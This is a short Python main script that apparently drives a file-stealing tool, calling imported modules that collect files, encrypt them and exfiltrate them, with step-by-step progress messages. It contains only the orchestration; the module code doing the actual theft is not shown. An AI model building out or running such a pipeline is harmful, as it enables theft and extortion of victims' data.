import collector
import encryptor
import exfiltrate

def main():
    print("[*] Step 1: Collecting files...")
    collector.main()

    print("[*] Step 2: Encrypting files...")
    encryptor.main()

    print("[*] Step 3: Exfiltrating files...")
    exfiltrate.main()

    print("[*] All steps completed successfully!")

if __name__ == "__main__":
    main()
